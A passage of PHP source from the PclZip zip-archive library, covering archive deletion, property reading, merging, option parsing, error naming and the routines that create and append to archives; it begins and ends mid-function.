      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

